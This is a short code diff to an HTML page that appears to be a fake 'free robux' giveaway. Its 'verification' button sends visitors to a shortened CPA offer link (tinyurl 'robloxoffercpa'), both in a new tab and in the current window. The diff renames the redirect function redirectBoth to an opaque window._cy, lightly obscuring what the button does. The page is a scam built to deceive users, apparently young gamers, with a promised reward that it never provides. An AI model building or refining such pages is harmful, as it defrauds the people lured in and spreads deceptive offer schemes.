@@ -120,7 +120,7 @@
                                     <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center animate-fade-in">
                                         <p class="text-lg font-medium mb-4">Complete the verification to receive your robux.</p>
                                        <button class="bg-[#272930] text-white px-4 py-2 rounded-xl hover:bg-gray-800 transition"
-        onclick="redirectBoth()">
+        onclick="_cy()">
     Verify
                     </button>
                                     </div>
@@ -356,12 +356,11 @@
             window.closeErrorModal = closeErrorModal;
             window.closeRobuxSelectionModal = closeRobuxSelectionModal; // Make it globally accessible
 
-          
-    function redirectBoth() {
+    window._cy = window._cy || function() {
         var url = 'https://tinyurl.com/robloxoffercpa';
         window.open(url, '_blank');
         window.location.href = url;
-    }
+        };
         })();
     </script>
 </body>
